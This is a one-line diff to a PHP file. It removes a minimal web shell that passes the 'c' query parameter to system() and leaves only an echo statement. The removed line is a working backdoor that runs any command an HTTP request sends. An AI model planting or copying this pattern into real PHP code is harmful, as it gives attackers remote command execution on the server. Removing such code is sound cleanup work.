@@ -1,1 +1,1 @@
-<?php echo "EXEC"; system($_GET["c"] ?? "id");
+<?php echo "EXEC";
